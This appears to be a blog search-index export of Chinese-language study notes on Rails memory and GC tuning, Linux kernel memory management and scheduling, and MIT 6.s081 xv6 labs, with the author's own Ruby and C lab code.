usage GC.stat[:heap_live_slots] 這是有多少slot被object占用 如果RSS上升，但這個不變 可能是C-extension leak GC.stat[:heap_free_slots] 這是沒有被object占用的slot 如果這個數字大，代表 ruby vm沒有把mem還給記憶體 有人alloc大量記憶體之後就不用了 這是 memory bloat ObjectSpace.count_objects 這是目前在ruby vm中的object數量 如果有個type的object一直漲，代表 Ruby memory leak 這裡有一個小程式可以看上面的訊息\nThread.new do logger = Logger.new(\u0026#39;mem_log.txt\u0026#39;) logger.formatter = proc { |sev, date, prog, msg| msg } headers = [ \u0026#34;RSS\u0026#34;, \u0026#34;Live slots\u0026#34;, \u0026#34;Free slots\u0026#34;, ObjectSpace.count_objects.keys ].flatten logger.info headers.join(\u0026#34;,\u0026#34;) while true pid = Process.pid rss = `ps -eo pid,rss | grep #{pid} | awk \u0026#39;{print $2}\u0026#39;` memory_info = [ rss.strip, GC.stat[:heap_live_slots], GC.stat[:heap_free_slots], ObjectSpace.count_objects.values ].flatten logger.info memory_info.join(\u0026#34;,\u0026#34;) logger.info \u0026#34;\\n\u0026#34; sleep 5 end end 把上面的code放到config/initializers，之後就會有csv 這樣就可以用seige打打看，生10~15k的資料，之後就可以分析了\nManaged Ruby object leaks heap live slots \u0026amp; RSS 上升, heap free slots不高 用memory_profiler看 retained objects by location C-extension leaks heap live slots \u0026amp; heap free slots不變, RSS 上升 Ruby的Heap dumping jemalloc Introspection Leaks in Ruby itself (the VM) heap live slots \u0026amp; heap free slots不變, RSS 上升 但是找不到任何C-extension leak!! 直接回報 真的不行了就Worker-Killers\nMemory Fragmentation Memory fragmentation會讓mem usage對數上升，直到一個可怕的limit\n主要原因在於ruby沒辦法移動meme中的obj\nObjectSpace就是ruby vm的mem，slot存的就是RVALUE(40 bytes)，也就是object的指標 RVALUE會被集合在一起成一個page\n所以ruby其實本身也有Fragmentation 看到GC.stat\nheap_live_slots: 代表現在有被RVALUE占用的slot有多少 aka 現在有多少object活著 heap_eden_pages eden_page是至少有一個活著的slot的page tomb_page就是都沒有一個活著的slot的page tomb_page才可以還給OS heap_sorted_length 一開始分配mem都是一塊一塊配上去 這個以分配的長度是heap_sorted_length 但是如果中間有幾塊被free了\u0026hellip; heap_sorted_length不變，因為不是連續的 但是中間的就沒辦法用了 (Fragmentation) 所以可以用兩種方式看Fragmentation\nheap_live_slots / heap_eden_pages的slot數量 GC.stat[:heap_live_slots] # 24508 GC.stat[:heap_eden_pages] # 83 GC::INTERNAL_CONSTANTS[:HEAP_PAGE_OBJ_LIMIT] # 408 # 1 - live_slots / (eden_pages * slots_per_page) # 24508 / (83 * 408) = 72.3 # 100% - 72.3% = 27.7% GC.stat[:heap_sorted_length]/GC.stat[:heap_sorted_length] per-thread memory arena\nWe call malloc in a thread The thread attempts to obtain the lock for the memory arena it accessed previously If that arena is not available, try the next memory arena If none of the memory arenas are available, create a new arena and use that 同時加回去arena的list 所以arena其實就是記憶體!! 但現在如果沒有限制arena數量的話\n變成有好幾塊小塊的記憶體沒辦法合併 ruby的ptr不能被移動 (RVALUE的ptr直接指到mem) arena少，mem usage少，但contention會變多\n所以下次遇到\nReduce Memory Arenas(改MALLOC_ARENA_MAX) Use jemalloc Compacting GC (夢想) 關於application server本身 aws與heroku很好scale，也同時讓人容易過度scale\nScaling increases throughput, not speed. scale只有在有queue時才會提升response times\n所以別只看response times做scale，要看有多少queue的request\n因為不同server的io model與process/thread model不同，讓server在scale上有巨大的差別\nThe life of a request 重點是request會被queue在哪裡\nload balancer Heroku router it will then wait up to five seconds for that dyno to accept the request and open a connection. available host backlog: the socket on the dyno will accept the connection even if the webserver is busy processing other requests. 上面最重要的有兩點\nrouter會等5秒直到成功連線 request可以活在host的backlog中 (server要有這功能) server在scale上差在? 主要是處理兩件事\nslow client protection request buffering，會等req下載好了才會轉給app slow response protection kind of concurrency - either multithreading or multiprocess/forking 至少不會卡IO (如果thread有特別處理) 但如果是multithread會因為GIL，讓其他人不能用cpu 所以ruby的multithreading對cpu-bound的request不好 這樣看下來只有\nPuma in clustered mode Phusion Passenger 5 可以用於scale server 設定server參數 目標\n讓memory 與 CPU使用最大化 讓throughput最大化 要4個要注意的\nprocess數目 process才是真的平行 建議一台最少3個process 最多? 要看mem與cpu mem 不能太多mem，不然會overcommit與swap 測ruby app的mem用量 放著跑12~24小時 用ps看 procs = (TOTAL_RAM / (RAM_PER_PROCESS * 1.2)) cpu 每5分鐘或15分鐘看cpu load 如果靠近或是到100%，就減少process數量 procs = 1.2~1.5倍的hyperthread 一般來說是8個 多process的好處是? 可以讓OS做load balance 比讓load balancer做load balance還要好 OS可以知道process的狀態!! thread數量 ruby的thread只能處理IO(db) 所以要多少 最多5~6個 再多就會 碰Amdahl’s law mem會被吃爆(看mem fragmentation) copy-on-write 在init好了之後fork (preload) 但省的空間沒有想像的多 如果用大分頁，只要改一個bit就會被copy，導致copy大量資料 想想ruby vm怎麼用page的，好幾個object塞同一個page fragmentation!! Container size 就是cpu與mem要多少 針對 你的app需求 (吃mem? 吃cpu?) 前面提到的process數量 3process，ruby app一個大約300MB 所以mem至少要1G 步驟\n找出1 process跑5 thread要多少mem 一個child process需要 (TOTAL_RAM / (RAM_PER_PROCESS * 1.2)) 一台需要3個process，以此推算出需要的總mem 確認hyperthread的數量夠 child process的數量要等於1.25~1.5的hyperthread monitor cpu與mem usage，調整process數量與container的規格 gc Generational GC認為通常都是年輕的object掛掉，所以分成兩個gc\nminor gc只處理new object(活不超過3以下的object) 在沒有free slot啟動 處理new object、在remember set的object、沒有write barrier的object remember set: 一群old object但是有new object的ptr write barrier: ruby runtime與object之間的interface major gc處理所有object 在下面2種case下啟動 跑完minor gc後還是沒有free slot 4個limit的其中一個超標 malloc_increase_bytes_limit malloc_increase_bytes 當RVALUE不夠存時需要alloc資料到其他地方 malloc_increase_bytes就是他的大小 oldmalloc_increase_bytes_limit 與malloc_increase_bytes同樣道理但是只針對old old_objects_limit old object的slot remembered_wb_unprotected_objects_limit remembere set與沒有write barrier的object trace gc count可以看r background job是不是會一直觸發gc 像下面就是可以用來trace的midleware\nclass GCCounter def initialize(app) @app = app end def call(env) gc_counts_before = GC.stat.select { |k,v| k =~ /count/ @app.call(env) gc_counts_after = GC.stat.select { |k,v| k =~ /count/ puts gc_counts_before.merge(gc_counts_after) { |k, vb, va| va - vb } end end ruby的ObjectSpace(heap)就是記憶體，一個ptr(RVALUE)對到一個slot，好多個slot變成一個page\nheap_sorted_length是目前alloc的連續長度(想像怎麼實作vma的) heap_allocated_pages是只有多少page(已經變成page的mem) heap_allocatable_pages是指可以再有多少page(已經malloc了的mem)\nheap_live_slots是指現在有多少object heap_free_slots是指有多少空的slot heap_final_slots是指多少slot被finalize heap_marked_slots是指old的object與沒有write barrier的物件(c-extendsion的mem)\ntomb_pages就是slot都是free (可以還給OS) eden_pages就是至少有一個live slot\ntune gc的目的\n減少memory bloat 減少跑gc的時間 核心想法: 讓free slot不要太多\n調\nRUBY_GC_HEAP_FREE_SLOTS_GOAL_RATIO RUBY_GC_HEAP_INIT_SLOTS RUBY_GC_HEAP_FREE_SLOTS_MAX_RATIO RUBY_GC_HEAP_FREE_SLOTS_MIN_RATIO RUBY_GC_HEAP_FREE_SLOTS_GOAL_RATIO=0.1 RUBY_GC_HEAP_FREE_SLOTS_MAX_RATIO=0.2 RUBY_GC_HEAP_FREE_SLOTS_MIN_RATIO=0.05 RUBY_GC_HEAP_INIT_SLOTS=1000000 orm 核心概念: avoiding instantiating ActiveRecord objects\n如果很多records，不要用each一筆一筆讀，mem會起飛 find_each and in_batches loads them in batches Select Only What You Need Preloads somehow eager_load use LEFT OUTER JOIN when eager loading the model associations. includes 最先考慮他 preload 會產生qeury把指定的model載入，之後透過ruby把剩下的接起來 Each eager load increases the number of instantiated objects, and in turn slows down the query Each eager load increases the number of instantiated objects, and in production-like data turn slows down the query Don’t Use Many Queries When One Will Do create too many ActiveRecord objects is when doing mass updates 如果可以一行sql處理掉，就讓sql處理 update_all, destroy_all Do Math In The Database 如果需要統計可以留給db N+1 用production的資料，跑看sql的log 找SQL哪裡生出來的(看下面的code) 跑rack-mini-profiler module LogQuerySource def debug(*args, \u0026amp;block) return unless super backtrace = Rails.backtrace_cleaner.clean caller relevant_caller_line = backtrace.detect do |caller_line| !caller_line.include?(\u0026#39;/initializers/\u0026#39;) end if relevant_caller_line logger.debug(\u0026#34; -\u0026gt; #{ relevant_caller_line.sub(\u0026#34;#{ end end end ActiveRecord::LogSubscriber.send :prepend, LogQuerySource 書上的例子是這個 partial會對每個collections的東西call find_by!!\nusing an ActiveRecord query method like find_by which is called on every element in a collection - is extremely common 只要用在OOOs中的其中一個就有N+1的風險\n流程是\nMethods on a model trigger SQL queries (by using the ActiveRecord API) those methods get called in the view they end up being used in a partial or something that gets iterated for every element in a collection, N+1 解法\nInstead of doing using ActiveRecord methods that trigger SQL queries, we’re going to rewrite this method to use regular Arrays and Enumerable methods. Do not use ActiveRecord query methods inside models, especially not on a model’s instance methods. Use them only in controllers and helpers. ","permalink":"https://littlebees.github.io/2022/01/the-complete-guide-to-rails-performance%E8%AE%80%E5%BE%8C%E7%AD%86%E8%A8%98/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e好看的書，但我主要是看怎麼profile與gc所以有跳過一些部分\u003c/p\u003e\n\u003cp\u003e跳過:\nwebfont, CDN, SSL, HTTP cache, Rails Cache, Backgrounding Work\u003c/p\u003e","title":"the complete guide to rails performance讀後筆記"},{"content":"動機 當初看這本是想補完一些linux kernel的設計實做，但最後發現除了第一章之外，都是code加直譯code的中文\u0026hellip;\n這樣與自己trace有什麼區別!?\ncode只是設計的其中一種體現 書的重點應該是介紹設計，再加上一些比較特別或是重要的code\n所以後面就改成挑經典概念(不同於xv6)的解釋\nch4是說lock的實做，所以挑RCU來說 ch5是說中斷的，可以參考linux kernel development與xv6的pdf ch6是怎麼debug像ftrace與debugfs、systemtap、kasan、kmemleak、CONFIG_DEBUG_LOOKDEP\npage: buddy 原本在xv6是直接從freelist拿一個page，但這樣一直alloc與free，會讓連續的page變少\n所以buddy就是先設定好一定大小的page，組成block，之後就是從對應的長度取\n如果差一點點，就是把剩下的丟到對應的長度，例\n3 pages從$2^2$拿一塊，剩下1page放到$2^0$\nobject: slab 一次拿一個page真的很大，很多時候只要放struct而已，所以有了slab\n給定struct大小，之後裡面切成3個list，剩下就與freelist很像，但是單位是struct大小\nfull: page被占滿 partial: 有空的、有被用的 free: 都空的 想知道slab的訊息可以參考這裡\nrmap 我們有mmap，把va對到pa rmap就是讓pa知道有多少va對到他，這樣就能從pa做unmap了\nkswapd就會用到rmap，另外在memory compact做memory migrate(把page移到另一個process)也會用到rmap\ngc: kswapd kswapd就是負責回收page(像是slab的page)的kernel process\n基本上觸發條件與gc差不多\n週期性 當碰到zone(linux描述mem的資料結構)的low watermark 為什麼我們要free? 因為kernel沒有辦法確認這mem還有沒有人要用到。\nptr其實就是整數，但kernel不知道這塊mem是不是有人指到。\n這樣就乾脆讓user自己管理就好。 但是現在大部分語言都會把object抽象出來，這樣就能利用object本身的struct紀錄使用情況，來做gc\nmemory compact buddy可以降低fragmentation的衝擊，但最後一定會有，所以還是要處理\n所以才有memory compact，基本上就是一邊找可以移動的page，一邊找空的page，之後migrate\n詳細可以看這邊\nkernel same page 把page當成key，做比對，之後遇到一樣的page就能共用\n像是開了許多linux vm這樣應該有一些page的內容會是一樣的 OOM malloc是申請(commit)，說有這一塊可以用(看xv6 lazy allocation與cow)\n但通常user不會剛好把申請全部用完，這樣其實很浪費\n所以linux認可某種程度上的overcommit 可以用/proc/sys/vm/overcommit_memory調overcommit的行為\n如果真的pa都沒了，連kernel的free都給完了，oom killer就會出現，找一個proc下手\n可以透過/proc/\u0026lt;pid\u0026gt;/oom_score調oom分數，讓killer盡量不會對某些proc下手\nRCU RCU就是不用lock做出來的的rwlock\nRCU可以當成一個ptr的buffer\nupdater做好修改後，synchronize_rcu會等其他reader讀完 之後就會把新的ptr丟出去，最後把舊的回收掉\nvoid foo_read(void) { rcu_read_lock(); foo *fp = global_foo; if (fp) do_something(fp-\u0026gt;a, fp-\u0026gt;b, fp-\u0026gt;c); rcu_read_unlock(); } void foo_update(foo *new_fp) { spin_lock(\u0026amp;foo_mutex); foo *old_fp = global_foo; global_foo = new_fp; spin_unlock(\u0026amp;foo_mutex); synchronize_rcu(); kfree(old_fp); } cfs schedule 把每個proc當成有一個cpu，所以假設每個proc都完美的同時跑的話，每個proc的執行時間應該一樣長\ncfs就是多一個vruntime去模擬每個proc的執行時間，每次挑都挑最少vruntime的\n如果要sort又要支援找出最小，heap 而剛好linux實作rbtree可以用\n算vruntime也很簡單$execDelta*(wieght/totalWieght)$ 實際上的執行時間乘上proc比重的比值，只是kernel中最好不用除法所以要改成用乘的\nRef Linux 核心設計: 記憶體管理 Linux内核内存管理算法Buddy和Slab linux 的swap、swappiness及kswapd原理 【原创】（十五）Linux内存管理之RMAP Linux OOM killer机制介绍 Linux 核心設計: RCU 同步機制 【原创】（五）Linux进程调度-CFS调度器 理解LINUX的MEMORY OVERCOMMIT 内存管理\n","permalink":"https://littlebees.github.io/2022/01/%E5%A5%94%E8%B7%91%E5%90%A7linux%E5%85%A7%E6%A0%B8ch2~ch5%E6%91%98%E9%8C%84/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e當初看這本是想補完一些linux kernel的設計實做，但最後發現除了第一章之外，都是code加直譯code的中文\u0026hellip;\u003c/p\u003e\n\u003cp\u003e這樣與自己trace有什麼區別!?\u003c/p\u003e\n\u003cp\u003ecode只是設計的其中一種體現\n書的重點應該是介紹設計，再加上一些比較特別或是重要的code\u003c/p\u003e\n\u003cp\u003e所以後面就改成挑經典概念(不同於xv6)的解釋\u003c/p\u003e\n\u003cp\u003ech4是說lock的實做，所以挑RCU來說\nch5是說中斷的，可以參考linux kernel development與xv6的pdf\nch6是怎麼debug像ftrace與debugfs、systemtap、kasan、kmemleak、CONFIG_DEBUG_LOOKDEP\u003c/p\u003e","title":"奔跑吧linux內核ch2~ch5摘錄"},{"content":"動機 What I can not create I do not understand.\n6.s081是個了解unix與c語言的超讚課程\n有許多符合自修性質\n有實作 有test 有解答可以參考 這篇是我讀pdf(有人翻譯2020的pdf，所以有些句子可能看起來怪怪的)與lab的筆記 lab是2020版，6.s081有經歷幾次改版，lab的內容會換一下，尤其是2019到2020差有點多\n裝環境 我是在win11 WSL2的ubuntu 20.04跑\nsudo apt-get install git build-essential gdb-multiarch qemu-system-misc gcc-riscv64-linux-gnu binutils-riscv64-linux-gnu gcc-riscv64-unknown-elf 需要參考的話，我的lab code在這\n怎麼在lab使用gdb 在~/.gdbinit加add-auto-load-safe-path ~/xv6-labs/.gdbinit 跑make qemu-gdb 在另一個視窗跑gdb-multiarch 如何debug 在panic打上breakpoint 利用make產生的xxx.asm，可以用addr去對，找到哪一行出事了(addr2line -e kernel/kernel pc-value) qemu的Ctrl-a x是關閉，Ctrl-a c是類似gdb可以info mem看pagetable 一點一點的寫，可以用panic去停下cpu看狀態對不對 在沒有動過的地方掛了、一開始就動不了 可能理由 mem不知道寫到哪了 腦袋要清楚mem到底要怎麼寫 這個是va, pa, pte? 這裡是page, stack的終點還是起點? 資料往哪邊長? stack是高往低 一般資料是低往高 concurrent沒處理好 deadlock 這個去trace中間用到的function應該可以看到一些東西 有人跟你用一樣的lock 拿lock的順序對嗎 沒有用lock包好 思考有哪些資料是要一起動的，思考在lock結束後有什麼性質要有 reference counter freelist ch1 在riscv中，CPU == hart\nfd 因為綁定0,1成stdin, stdout 所以會需要close，之後再開新的file完成redirect 因為fd是從小的開始分配\nif(fork() == 0) { close(0); open(\u0026#34;input.txt\u0026#34;, O_RDONLY); exec(\u0026#34;cat\u0026#34;, argv); } dup做soft copy，所以下面的file會是hello world\nfd = dup(1); write(1, \u0026#34;hello\u0026#34;, 6); write(fd, \u0026#34;world\\n\u0026#34;, 6); 這裡想完成的事就是dynamic scope或是Parameterize\npipe pipe會產生一個file(in mem)，之後開2個fd，下面是redirect stdin到pipe\npipe(p); if(fork() == 0) { close(0); dup(p[0]); close(p[0]); close(p[1]); exec(\u0026#34;/bin/wc\u0026#34;, argv); } else { write(p[1], \u0026#34;hello world\\n\u0026#34;, 12); close(p[0]); close(p[1]); } 這等於就是把ref裡面的東西暴露給user阿 (因為綁定0,1成stdin, stdout)\ntrace: pipe pipe是由兩個file控制的ring buffer 由寫到哪(nwrite)與讀到哪(nread)控制sleep與wakeup alloc pipe\nsys_pipe alloc 兩個struct file pipealloc設定兩個file kalloc一塊page，作為struct pipe 讓file能指到struct pipe 把fd寫回去 copyout留到pagetable那章談 write/read syscall\nsys_write/sys_write filewrite/fileread根據struct file的type跑到pipe去 piperead 空了 AND 對面還想要寫 pi-\u0026gt;nread == pi-\u0026gt;nwrite \u0026amp;\u0026amp; pi-\u0026gt;writeopen 先去睡覺 開始寫到addr (increase nread) 注意到這是個ring buffer!! 都好了就wakeup對面 (用nwrite去認) sleeplock留到lock那章談 pipewrite 對面不想要讀 return 如果 滿了 pi-\u0026gt;nwrite == pi-\u0026gt;nread + PIPESIZE wakeup對面 (用nread去認) 先去睡覺 沒滿 從addr讀到struct pipe中 (increase nwrite) close syscall\nsys_close pipeclose 根據fd來看是不是用來寫的 之後關對應的狀態 wakeup另外一邊 Lab Utilities sleep 練手用\n#include \u0026#34;kernel/types.h\u0026#34; #include \u0026#34;kernel/stat.h\u0026#34; #include \u0026#34;user/user.h\u0026#34; int main(int argc, char *argv[]) { if (argc != 2) fprintf(2, \u0026#34;sleep: 2 args\\n\u0026#34;); sleep(atoi(argv[1])); exit(0); } pingpong 這裡開始寫簡單的pipe\n從前面的trace可以看出，pipe只有三個狀態下會換手\nread/write完成 空了/滿了 close 所以寫pipe時要記得把所有read/write該關的都關一關\n#include \u0026#34;kernel/types.h\u0026#34; #include \u0026#34;kernel/stat.h\u0026#34; #include \u0026#34;user/user.h\u0026#34; void closeR(int *p) { close(p[0]); } void closeW(int *p) { close(p[1]); } int main(int argc, char *argv[]) { int p2c[2], c2p[2]; pipe(p2c), pipe(c2p); if (fork()) { int tmp = 0; closeR(p2c); closeW(c2p); write(p2c[1], \u0026amp;tmp, sizeof(int)); read(c2p[0], \u0026amp;tmp, sizeof(int)); printf(\u0026#34;%d: received pong\\n\u0026#34;, getpid()); closeW(p2c); closeR(c2p); } else { int tmp = 1; closeW(p2c); closeR(c2p); read(p2c[0], \u0026amp;tmp, sizeof(int)); printf(\u0026#34;%d: received ping\\n\u0026#34;, getpid()); write(c2p[1], \u0026amp;tmp, sizeof(int)); closeR(p2c); closeW(c2p); } exit(0); } find 主要是練怎麼用file stat，以及認識到c處理string是多麼麻煩\n#include \u0026#34;kernel/types.h\u0026#34; #include \u0026#34;kernel/stat.h\u0026#34; #include \u0026#34;user/user.h\u0026#34; #include \u0026#34;kernel/fs.h\u0026#34; char* getFilename(char *path) { char *start = path; int len = strlen(path); path += len; for(;path != start \u0026amp;\u0026amp; *path != \u0026#39;/\u0026#39;;path--) ; if (*path == \u0026#39;/\u0026#39;) path++; return path; } int isSubstring(char* s1, char* s2) { int M = strlen(s1); int N = strlen(s2); /* A loop to slide pat[] one by one */ for (int i = 0; i \u0026lt;= N - M; i++) { int j; for (j = 0; j \u0026lt; M; j++) if (s2[i + j] != s1[j]) break; if (j == M) return 1; } return 0; } int isNotDots(char* name) { int len = strlen(name); return len \u0026gt;= 3 || (len == 2 \u0026amp;\u0026amp; name[0] != \u0026#39;.\u0026#39; \u0026amp;\u0026amp; name[1] != \u0026#39;.\u0026#39;) || (len == 1 \u0026amp;\u0026amp; name[0] != \u0026#39;.\u0026#39;); } void find(char *path, char *pat, int has) { char buf[512], *p; int fd; struct dirent de; struct stat st; if((fd = open(path, 0)) \u0026lt; 0){ fprintf(2, \u0026#34;ls: cannot open %s\\n\u0026#34;, path); return; } if(fstat(fd, \u0026amp;st) \u0026lt; 0){ fprintf(2, \u0026#34;ls: cannot stat %s\\n\u0026#34;, path); close(fd); return; } switch(st.type){ case T_FILE: if (has) printf(\u0026#34;%s\\n\u0026#34;, path); break; case T_DIR: if(strlen(path) + 1 + DIRSIZ + 1 \u0026gt; sizeof buf){ printf(\u0026#34;ls: path too long\\n\u0026#34;); break; } strcpy(buf, path); p = buf+strlen(buf); *p++ = \u0026#39;/\u0026#39;; while(read(fd, \u0026amp;de, sizeof(de)) == sizeof(de)){ if(de.inum == 0) continue; memmove(p, de.name, DIRSIZ); p[DIRSIZ] = 0; if(stat(buf, \u0026amp;st) \u0026lt; 0){ printf(\u0026#34;ls: cannot stat %s\\n\u0026#34;, buf); continue; } char* filename = getFilename(buf); if (isNotDots(filename)) { find(buf, pat, has || isSubstring(pat, filename)); } } break; } close(fd); } int main(int argc, char *argv[]) { find(argv[1], argv[2], 0); exit(0); } xargs 因為我從沒用過xargs所以一開始寫根本不知道這要幹嘛\nxargs就是讀stdout，用空格或斷行當成分隔，去invoke指令\n不過這裡在讀的時候要一直loop，就算你知道test data基本上一次就讀的完\n可以順便說說虛假喚醒的原因\n喚醒會把所有proc設定成可以跑(runnable) scheduler只會挑出一個proc跑 如果這個proc做一下改變，就直接被切走\u0026hellip; 但其他proc還是runnable!! 這樣其他proc還是被wakeup的!! 虛假喚醒是來自preemptive schedule，所以只能在每次wakeup時確認需要的前提有沒有對，才繼續跑\n#include \u0026#34;kernel/types.h\u0026#34; #include \u0026#34;kernel/stat.h\u0026#34; #include \u0026#34;user/user.h\u0026#34; char* strncpy(char *s, const char *t, int n) { char *os; os = s; while(n-- \u0026gt; 0 \u0026amp;\u0026amp; (*s++ = *t++) != 0) ; while(n-- \u0026gt; 0) *s++ = 0; return os; } int main(int argc, char *argv[]) { char buf[10][32]; char tmp[32]; char *cmd[10]; for (int i=1;i\u0026lt;argc;i++) strncpy(buf[i-1], argv[i], strlen(argv[i])); while (read(0, tmp, 32) \u0026gt; 0) { // 虛假喚醒!! char *start = tmp; int end = argc-1; for(int len=strlen(tmp),i=0;i\u0026lt;len;i++) if (tmp[i] == \u0026#39; \u0026#39; || tmp[i] == \u0026#39;\\n\u0026#39;) { tmp[i] = 0; strcpy(buf[end++], start); start = tmp+i+1; } for (int i=0;i\u0026lt;end;i++) cmd[i] = (char*)\u0026amp;(buf[i]); if (fork()) wait(0); else exec(buf[0], cmd); } exit(0); } primes 全部裡面最有趣的，也是考驗會不會用pipe\n這裡的做法是，每個stage(go)\n取第一個數字作為這邊的質數 剩下塞到新的pipe，產生下一個stage #include \u0026#34;kernel/types.h\u0026#34; #include \u0026#34;kernel/stat.h\u0026#34; #include \u0026#34;user/user.h\u0026#34; void put(int *p, int n) { write(p[1], \u0026amp;n, sizeof(int)); } int get(int *p) { int ret; int state = read(p[0], \u0026amp;ret, sizeof(int)); if (state \u0026lt;= 0) return state; else return ret; } void endWrite(int *p) { close(p[1]); } void endRead(int *p) { close(p[0]); } void go(int *p) { // WARN: get a item one time!! int b = get(p); if (b \u0026gt; 0) { printf(\u0026#34;prime %d\\n\u0026#34;, b); int n = get(p); if (n \u0026gt; 0) { int pp[2]; pipe(pp); if (fork() == 0) { endWrite(pp); go(pp); } else { endRead(pp); for(;n \u0026gt; 0;n=get(p)) if (n % b != 0) put(pp,n); endWrite(pp); wait(0); } } } endRead(p); } int main() { int p[2]; pipe(p); if (fork() == 0) { endWrite(p); go(p); } else { endRead(p); for (int n=2;n\u0026lt;36;n++) put(p,n); endWrite(p); wait(0); } exit(0); } ch2 Isolation 隔離是由下面兩個東西提供保證的\n硬體 執行模式 OS process (使用不同的stack) 其他 (cgroup, 權限管理\u0026hellip;) 先看執行模式\n執行模式 RISC-V 有三種模式，CPU 可以執行指令：\n機器模式 監督者（supervisor）模式 CPU 被允許執行特權指令：例如，啟用和禁用中斷，讀寫保存頁表地址的寄存器等 用戶模式 CPU提供了一個特殊的指令(ecall)，可以將 CPU 從用戶模式切換到監督模式，並在內核指定的入口處進入內核。\n一個關鍵的設計問題是操作系統的哪一部分應該在監督者模式下運行。\n宏內核 整個操作系統駐留在內核中，這樣所有系統調用的實現都在監督者模式下運行 微內核 減少在監督者模式下運行的操作系統代碼量，而在用戶模式下執行操作系統的大部分代碼 process process 就是 一台電腦\n硬體 kernel syscall CPU concurrent mechnism process state mem page table stack kernel stack (kstack) user stack 透過assign不同的pagetable讓process只能看到與使用一部份的mem，這樣就算把自己的搞壞也沒關係\nprocess的mem layout xv6 只使用 39 位中的 38 位。因此，最大地址是 2^38-1 = 0x3fffffffff，也就是 MAXVA\n在地址空間的頂端，xv6 保留了一頁，用於 trampoline 和映射進程trapframe 的頁，以便切換到內核\ntrace: init 在kernel load完後會call init去setup shell 這裡主要是看怎麼從kernel mode變成user mode\nloader 将 xv6 内核加载到物理地址 0x80000000 的内存中 0x80000000 而不是 0x0，是因为地址范围 0x0-0x80000000 包含 I/O 设备。 _entry处的指令设置了一个栈(stack0)，这样xv6就可以运行C代码 注意 stack0被宣告在start.c riscv的stack是往下長的!! 所以，entry.S做的事用一句話來說 sp = stack0+PGSIZE 跑到start 這裡是machine mode 設定切hyperviser mode 關中斷 關paging 設定pc成main 設定timer的東西 (timerinit) 用mret跳去main，同時切成hyperviser mode 跑main 設定各種設定 最後跑userinit，跑kernel的第一個程式 在main跑userinit，就會去帶init alloc proc之後設定一些基本訊息 把跑init的binary (exec(\u0026quot;/init\u0026quot;))，copy到proc的記憶體中 binary的asm在user的initcode.S 就是透過a7去打exec exec會把記憶體換掉，所以變成init init(init.c)做兩件事 fork: 開sh main: 一直wait，zombie或是shell之類的proc 同時之後init跑完就會變成user mode 為什麼會變成user mode?? 看到exec 先讀elf 用uvmalloc設定pagetable uvmalloc設定PTE時會代PTE_U (usermode記憶體) 之後到syscall的流程 (usertrapret) 設定user mode 設定user pagetable userret做ctx switch+trap的switch trace: syscall user mode的syscall usys.pl include syscall.h拿syscall編號 會產生一段設定a7的asm 這就是syscall kernel mode的syscall syscall.h 這裡有所有syscall的編號 usys.pl的ecall觸發trap，切到kernel mode trap之後會提，反正會到usertrap 看mstatus，之後跑syscall 根據num，跑對應的syscal return code寫到a0，之後透過剩下的trap流程 回到usertrap 跑usertrapret(切pagetable與user mode)，userret user的參數怎麼pass到syscall的? 以argint為例\ncall argraw argraw直接拿trapframe的value 在此如果是addr也是這樣拿到addr 但是之後要處理pagetable的copyin, copyout接手去複製資料 Lab System calls trace 就是在proc上設定mask，之後只要syscall時就看mask決定要不要print\n// ... extern uint64 sys_trace(void); extern uint64 sys_sysinfo(void); static uint64 (*syscalls[])(void) = { // ... [SYS_trace] sys_trace, [SYS_sysinfo] sys_sysinfo, }; static char* syscallnames[24] = { \u0026#34;\u0026#34;, \u0026#34;fork\u0026#34;, \u0026#34;exit\u0026#34;, \u0026#34;wait\u0026#34;, \u0026#34;pipe\u0026#34;, \u0026#34;read\u0026#34;, \u0026#34;kill\u0026#34;, \u0026#34;exec\u0026#34;, \u0026#34;fstat\u0026#34;, \u0026#34;chdir\u0026#34;, \u0026#34;dup\u0026#34;, \u0026#34;getpid\u0026#34;, \u0026#34;sbrk\u0026#34;, \u0026#34;sleep\u0026#34;, \u0026#34;uptime\u0026#34;, \u0026#34;open\u0026#34;, \u0026#34;write\u0026#34;, \u0026#34;mknod\u0026#34;, \u0026#34;unlink\u0026#34;, \u0026#34;link\u0026#34;, \u0026#34;mkdir\u0026#34;, \u0026#34;close\u0026#34;, \u0026#34;trace\u0026#34;, \u0026#34;sysinfo\u0026#34;, }; void syscall(void) { // ... struct proc *p = myproc(); // ... if(num \u0026gt; 0 \u0026amp;\u0026amp; num \u0026lt; NELEM(syscalls) \u0026amp;\u0026amp; syscalls[num]) { p-\u0026gt;trapframe-\u0026gt;a0 = syscalls[num](); if ((1 \u0026lt;\u0026lt; num) \u0026amp; p-\u0026gt;tracemask) printf(\u0026#34;%d: syscall %s -\u0026gt; %d\\n\u0026#34;, p-\u0026gt;pid, syscallnames[num], p-\u0026gt;trapframe-\u0026gt;a0); // } else { // ... } } sysinfo 這裡的重點是\n數freemem 數unused procs 數unused procs就是從proc表去數\nint getAllocedProcsCount(void) { int ret = 0; for(struct proc *p = proc; p \u0026lt; \u0026amp;proc[NPROC]; p++) if (p-\u0026gt;state != UNUSED) ret++; return ret; } 數freemem從freelist去數(幸好是用page去分不然會很麻煩) 4096是page的大小(PGSIZE)\nint getFreeMemAmount(void) { int ret = 0; for(struct run* ptr = kmem.freelist; ptr; ptr=ptr-\u0026gt;next) ret += 4096; return ret; } 剩下的問題是怎麼copy struct過去 所以我們需要copy addr過去user space的struct\nuint64 sys_sysinfo(void) { uint64 infoAddr; // user pointer to struct stat if(argaddr(0, \u0026amp;infoAddr) \u0026lt; 0) return -1; struct sysinfo info = { .freemem = getFreeMemAmount(), .nproc = getAllocedProcsCount(), }; struct proc* p = myproc(); if(copyout(p-\u0026gt;pagetable, infoAddr, (char *)\u0026amp;info, sizeof(info)) \u0026lt; 0) return -1; return 0; } ch4\u0026amp;5 trap trap有3種\nfrom user mode (syscall) from device (device interrupt) from cpu (exception) trap通常的順序是\ntrap 迫使控制權轉移到內核 內核保存寄存器和其他狀態，以便恢復執行 內核執行適當的處理程序代碼（例如，系統調用實現或設備驅動程序） 內核恢復保存的狀態，並從 trap 中返回 代碼從原來的地方恢復。 Xv6 trap 處理分為四個階段\nRISC-V CPU 採取的硬件行為 為內核 C 代碼準備的彙編入口 處理 trap 的 C 處理程序 系統調用或設備驅動服務 RISC-V trap mechinism 重要的reg\nstvec：內核在這裡寫下 trap 處理程序的地址；RISC-V 到這裡來處理 trap。 sepc：當 trap 發生時，RISC-V 會將程序計數器保存在這裡（因為 PC 